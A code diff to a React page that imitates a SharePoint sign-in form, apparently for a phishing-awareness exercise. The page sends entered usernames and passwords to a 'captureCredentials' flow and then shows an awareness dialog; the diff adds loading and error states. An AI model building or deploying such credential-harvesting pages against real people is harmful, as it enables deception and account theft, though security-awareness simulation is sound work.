@@ -2,7 +2,7 @@
 
 import { FormEvent, useState } from 'react';
 import Image from 'next/image';
-import { ShieldX } from 'lucide-react';
+import { ShieldX, AlertTriangle } from 'lucide-react';
 
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Input } from '@/components/ui/input';
@@ -22,7 +22,9 @@ import { captureCredentials } from '@/ai/flows/capture-credentials';
 export default function SharePointLoginPage() {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
-  const [showAlert, setShowAlert] = useState(false);
+  const [showSuccessAlert, setShowSuccessAlert] = useState(false);
+  const [showErrorAlert, setShowErrorAlert] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
   const bgImage = PlaceHolderImages.find((img) => img.id === 'login-background');
 
   // ------------------------
@@ -30,14 +32,17 @@ export default function SharePointLoginPage() {
   // ------------------------
   const handleSubmit = async (event: FormEvent) => {
     event.preventDefault();
+    setIsLoading(true);
     try {
       // Send credentials to the server-side flow.
       await captureCredentials({ username, password });
-      setShowAlert(true);
+      setShowSuccessAlert(true);
     } catch (error) {
       // The client-side logic is designed to show the alert regardless of success or failure.
       console.error('Error in handleSubmit:', error);
-      setShowAlert(true);
+      setShowErrorAlert(true);
+    } finally {
+      setIsLoading(false);
     }
   };
 
@@ -52,6 +57,7 @@ export default function SharePointLoginPage() {
           priority
           style={{ objectFit: 'cover', pointerEvents: 'none' }}
           className="absolute inset-0 z-0"
+          data-ai-hint={bgImage.imageHint}
         />
       )}
 
@@ -83,6 +89,7 @@ export default function SharePointLoginPage() {
               value={username}
               onChange={(e) => setUsername(e.target.value)}
               className="w-full p-3 border-gray-300 rounded-md text-base"
+              disabled={isLoading}
             />
 
             <Input
@@ -93,13 +100,15 @@ export default function SharePointLoginPage() {
               value={password}
               onChange={(e) => setPassword(e.target.value)}
               className="w-full p-3 border-gray-300 rounded-md text-base"
+              disabled={isLoading}
             />
 
             <Button
               type="submit"
               className="w-full p-3 mt-2 bg-[#0078D4] text-white font-bold rounded-md hover:bg-blue-700 transition-colors"
+              disabled={isLoading}
             >
-              Sign in
+              {isLoading ? 'Signing in...' : 'Sign in'}
             </Button>
           </form>
 
@@ -111,10 +120,9 @@ export default function SharePointLoginPage() {
       </Card>
 
       {/* Awareness Alert Dialog */}
-      <AlertDialog open={showAlert} onOpenChange={setShowAlert}>
+      <AlertDialog open={showSuccessAlert} onOpenChange={setShowSuccessAlert}>
         <AlertDialogContent>
           <AlertDialogHeader>
-            {/* ✅ Added Trellissoft Logo */}
             <div className="flex justify-center mb-4">
               <Image
                 src="https://trellissoft.ai/wp-content/uploads/2025/03/Trellissoft-logo-with-tagline-4.png"
@@ -148,10 +156,35 @@ export default function SharePointLoginPage() {
 
           <AlertDialogFooter className="sm:justify-center mt-4">
             <AlertDialogAction
-              onClick={() => setShowAlert(false)}
+              onClick={() => setShowSuccessAlert(false)}
               className="bg-[#217346] text-white hover:bg-green-800"
             >
               Continue
+            </AlertDialogAction>
+          </AlertDialogFooter>
+        </AlertDialogContent>
+      </AlertDialog>
+
+      {/* Error Alert Dialog */}
+      <AlertDialog open={showErrorAlert} onOpenChange={setShowErrorAlert}>
+        <AlertDialogContent>
+          <AlertDialogHeader>
+            <div className="flex justify-center mb-3">
+              <AlertTriangle className="w-14 h-14 text-yellow-400" />
+            </div>
+            <AlertDialogTitle className="text-2xl font-semibold text-center text-white">
+              Submission Failed
+            </AlertDialogTitle>
+          </AlertDialogHeader>
+          <AlertDialogDescription className="mt-2 text-center text-gray-400 leading-relaxed">
+            There was a problem submitting your request. This may be due to a server configuration issue. Please try again later.
+          </AlertDialogDescription>
+          <AlertDialogFooter className="sm:justify-center mt-4">
+            <AlertDialogAction
+              onClick={() => setShowErrorAlert(false)}
+              className="bg-destructive text-destructive-foreground hover:bg-destructive/90"
+            >
+              Close
             </AlertDialogAction>
           </AlertDialogFooter>
         </AlertDialogContent>
